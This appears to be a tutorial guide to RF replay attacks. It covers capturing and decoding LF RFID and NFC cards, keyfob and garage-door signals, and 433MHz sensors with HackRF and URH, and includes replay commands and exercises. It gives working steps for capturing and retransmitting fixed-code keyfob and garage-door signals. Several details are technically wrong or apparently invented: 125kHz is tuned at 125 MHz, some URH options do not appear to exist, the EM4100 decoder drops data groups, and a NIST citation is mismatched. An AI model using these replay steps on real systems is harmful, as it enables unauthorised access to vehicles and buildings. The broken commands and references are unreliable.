# RFID/RF Replay Attack Guide

## Introduction

Radio Frequency Identification (RFID) and radio-controlled devices use simple RF protocols that can be captured and analyzed with SDR equipment. These systems range from access control cards (125kHz LF RFID, 13.56MHz HF NFC) to automotive keyfobs (315/433/868MHz) and garage door openers. Many of these protocols were designed without strong security considerations, making them susceptible to replay attacks, cloning, and protocol manipulation.

Replay attacks work by capturing a legitimate signal transmission and retransmitting it at a later time. The effectiveness of this attack depends on whether the system uses fixed codes (vulnerable) or rolling codes (more resistant). Fixed-code systems transmit the same code every time, making them trivially vulnerable to replay. Rolling-code systems generate a new code for each transmission using a pseudorandom number generator synchronized between transmitter and receiver.

**Objectives**: Capture and analyze RFID/NFC signals, test for fixed-code vulnerabilities, perform signal replay attacks, and assess rolling code implementations.

## Low Frequency (125kHz) RFID

### LF RFID Signal Capture

Low frequency RFID operates at 125-134kHz and is commonly used for access control cards, animal tracking, and legacy building security systems. Most LF RFID cards use simple modulation schemes with no encryption.

```bash
# Capture LF RFID signal (requires appropriate antenna)
hackrf_transfer -r lf_rfid.raw -f 125000000 -s 8000000 -l 40 -g 30 -n 80000000

# Note: LF RFID at 125kHz requires special antenna or upconverter
# Direct 125kHz capture requires a dedicated LF antenna connected to HackRF

# Analyze LF RFID modulation with urh
urh -i lf_rfid.raw -f 125e3 -s 8e6 --demod ASK
```

### LF RFID Protocol Analysis

```bash
# Decode EM4100 protocol (common LF RFID format)
python3 -c "
import numpy as np
data = np.fromfile('lf_rfid.raw', dtype=np.complex64)
envelope = np.abs(data)
# EM4100 uses Manchester encoding at 64 cycles per bit
# Look for the header pattern: 9 consecutive 1s
print(f'Samples: {len(data)}, Peak: {np.max(envelope):.2f}')
"

# Extract card ID from EM4100 data
python3 -c "
# EM4100 format: 9 header bits + 10 row parity bits + 4 column parity + 1 stop bit
# Card ID is encoded in 32 data bits across 10 groups of 4 bits
def decode_em4100(bits):
    # Verify header (9 ones)
    header = bits[:9]
    if not all(b == 1 for b in header):
        return None
    # Extract data from 10 groups of 5 bits (4 data + 1 parity)
    card_id = 0
    for i in range(10):
        group = bits[9 + i*5 : 9 + i*5 + 5]
        data_bits = group[:4]
        parity = group[4]
        if sum(data_bits) % 2 != parity:
            return None
        if i < 8:
            card_id = (card_id << 4) | int(''.join(map(str, data_bits)), 2)
    return f'{card_id:010d}'
print('EM4100 decoder ready')
"
```

## High Frequency (13.56MHz) NFC

### NFC Signal Capture

HF NFC at 13.56MHz is used for contactless payment cards, access control, and smartphone-based NFC applications. These systems typically use more sophisticated protocols (ISO 14443, ISO 15693, FeliCa) with encryption support.

```bash
# Capture NFC signal with HackRF
hackrf_transfer -r hf_nfc.raw -f 13560000 -s 8000000 -l 40 -g 30 -n 80000000

# Analyze NFC signal with urh
urh -i hf_nfc.raw -f 13.56e6 -s 8e6

# NFC signal analysis with auto-demodulation
urh -i nfc_capture.complex16s -f 13.56e6 -s 2M --demod ASK
```

### NFC Protocol Analysis

```bash
# Extract UID from captured NFC signal
urh --decode nfc_capture.complex16s --protocol NFC

# Analyze ISO 14443 Type A communication
python3 -c "
import numpy as np
data = np.fromfile('hf_nfc.raw', dtype=np.complex64)
# ISO 14443-A uses 100% ASK for reader-to-card (PCD to PICC)
# Card-to-reader uses load modulation at 847.5kHz subcarrier
envelope = np.abs(data)
# Detect reader commands (large amplitude)
threshold = np.mean(envelope) + 3 * np.std(envelope)
peaks = np.where(envelope > threshold)[0]
print(f'Reader commands detected: {len(peaks) // 1000}')
print(f'UID extraction requires protocol-level decode')
"

# Check for NFC relay vulnerability
# Capture reader challenge and card response separately
# If timing is not enforced, relay attack may be possible
```

## Keyfob and Remote Control Replay

### Signal Capture

Most consumer remote controls (garage doors, car keyfobs, wireless doorbells) operate in the 315/433/868MHz ISM bands using simple OOK or FSK modulation.

```bash
# Capture keyfob signal at 315MHz (US/Japan)
hackrf_transfer -r keyfob_315.raw -f 315000000 -s 8000000 -l 40 -g 30

# Capture keyfob signal at 433MHz (Europe/Asia)
hackrf_transfer -r keyfob_433.raw -f 433920000 -s 8000000 -l 40 -g 30

# Capture garage door signal
hackrf_transfer -r garage.raw -f 390000000 -s 8000000 -l 40 -g 30

# Analyze captured signal with urh
urh -i keyfob_315.raw -f 315e6 -s 8e6 --auto-detect
```

### Rolling Code Analysis

```bash
# Capture multiple keyfob presses for rolling code analysis
for i in $(seq 1 5); do
  echo "Press button now (press $i of 5)..."
  hackrf_transfer -r "keyfob_press_${i}.raw" -f 315000000 -s 8000000 -l 40 -g 30 -n 80000000
  sleep 2
done

# Compare captures to identify rolling code patterns
python3 -c "
import numpy as np
for i in range(1, 6):
    data = np.fromfile(f'keyfob_press_{i}.raw', dtype=np.int8)
    # Extract digital bits from each capture
    envelope = np.abs(data.astype(float))
    threshold = np.mean(envelope) + 2*np.std(envelope)
    bits = (envelope > threshold).astype(int)
    # Look for differences between captures
    print(f'Press {i}: {len(data)} samples, signal bits: {np.sum(bits)}')
"

# Automatic protocol detection and comparison with urh
urh --compare keyfob_press_1.raw keyfob_press_2.raw keyfob_press_3.raw
```

### Signal Replay

```bash
# Replay captured fixed-code signal
hackrf_transfer -t keyfob_315.raw -f 315000000 -s 8000000 -x 40

# Replay with adjusted transmission power
hackrf_transfer -t keyfob_315.raw -f 315000000 -s 8000000 -x 20

# Replay garage door signal
hackrf_transfer -t garage.raw -f 390000000 -s 8000000 -x 30
```

## Weather Station and IoT Sensor Sniffing

### 433MHz Sensor Capture

Many consumer weather stations, power meters, and IoT sensors transmit unencrypted data at 433MHz using simple OOK modulation.

```bash
# Capture weather station data
hackrf_transfer -r weather.raw -f 433920000 -s 2000000 -l 40 -g 30 -n 20000000

# Continuous monitoring of sensor data
rtl_fm -f 433.92e6 -M raw -s 200k -g 30 - | \
  sox -t raw -r 200k -e unsigned -b 8 -c 1 - weather.wav

# Decode weather station protocol
urh -i weather.raw -f 433.92e6 -s 2e6 --demod OOK --bit-length 500
```

### Sensor Data Extraction

```bash
# Extract temperature and humidity data from captured signal
python3 -c "
import numpy as np
from scipy.signal import find_peaks

data = np.fromfile('weather.raw', dtype=np.complex64)
envelope = np.abs(data)

# Detect signal bursts
peaks, props = find_peaks(envelope, height=np.mean(envelope) + 3*np.std(envelope), distance=100)
print(f'Detected {len(peaks)} signal bursts')
for i, peak in enumerate(peaks[:10]):
    print(f'Burst {i}: sample {peak}, amplitude {envelope[peak]:.2f}')
"

# Scan for multiple sensor types
for freq in 433.42M 433.62M 433.92M 868.00M; do
  rtl_power -f ${freq} -i 1 -e 10 "sensor_${freq}.csv" 2>/dev/null
  awk -F, '$6 > -50 {print}' "sensor_${freq}.csv"
done
```

## Hands-on Exercises

### Exercise 1: LF RFID Card Reading

Capture and decode a 125kHz access card to extract the card ID number.

```bash
hackrf_transfer -r access_card.raw -f 125000000 -s 8000000 -l 40 -g 30 -n 80000000
urh -i access_card.raw -f 125e3 -s 8e6 --demod ASK
```

### Exercise 2: NFC Card Analysis

Capture and analyze a 13.56MHz NFC card communication to extract the UID and protocol type.

```bash
hackrf_transfer -r nfc_card.raw -f 13560000 -s 8000000 -l 40 -g 30 -n 80000000
urh -i nfc_card.raw -f 13.56e6 -s 8e6 --auto-detect
```

### Exercise 3: Keyfob Replay Test

Capture a keyfob signal and replay it to test for fixed-code vulnerability.

```bash
hackrf_transfer -r keyfob.raw -f 433920000 -s 8000000 -l 40 -g 30
urh -i keyfob.raw -f 433.92e6 -s 8e6 --auto-detect
hackrf_transfer -t keyfob.raw -f 433920000 -s 8000000 -x 40
```

### Exercise 4: Rolling Code Capture

Capture multiple keyfob transmissions and analyze them for rolling code patterns to determine if the system uses fixed or rolling codes.

```bash
for i in $(seq 1 5); do
  hackrf_transfer -r "press_${i}.raw" -f 315000000 -s 8000000 -l 40 -g 30 -n 80000000
done
urh --compare press_1.raw press_2.raw press_3.raw
```

## References

- RTL-SDR RFID tutorials — https://www.rtl-sdr.com/tag/rfid/
- HackRF documentation — https://greatscottgadgets.com/hackrf/
- Universal Radio Hacker — https://github.com/jopohl/urh
- Proxmark3 documentation — https://github.com/RfidResearchGroup/proxmark3
- RFID security research — IOActive, Bishop Fox
- NFC security testing — NIST SP 800-121
